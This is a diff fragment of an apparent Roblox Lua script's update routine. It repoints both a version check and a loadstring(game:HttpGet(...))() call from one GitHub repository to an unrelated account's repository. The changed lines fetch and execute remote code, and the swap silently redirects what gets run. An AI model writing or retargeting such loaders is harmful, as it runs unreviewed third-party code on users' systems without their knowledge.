@@ -1450,7 +1450,7 @@ InfoTab:Button({
         
         task.spawn(function()
             local success, result = pcall(function()
-                return game:HttpGet("https://raw.githubusercontent.com/syannnho/ASTRIONV3/refs/heads/main/VERSION")
+                return game:HttpGet("https://raw.githubusercontent.com/v0ydxfc6666/v0ydffx/refs/heads/main/ffx/")
             end)
             
             if success then
@@ -1462,7 +1462,7 @@ InfoTab:Button({
                     task.wait(2)
                     
                     pcall(function()
-                        loadstring(game:HttpGet("https://raw.githubusercontent.com/syannnho/ASTRIONV3/refs/heads/main/SCRIPT"))()
+                        loadstring(game:HttpGet("https://raw.githubusercontent.com/v0ydxfc6666/v0ydffx/refs/heads/main/ffx/"))()
                     end)
                 else
                     notify("Update", "Already up to date", 2)
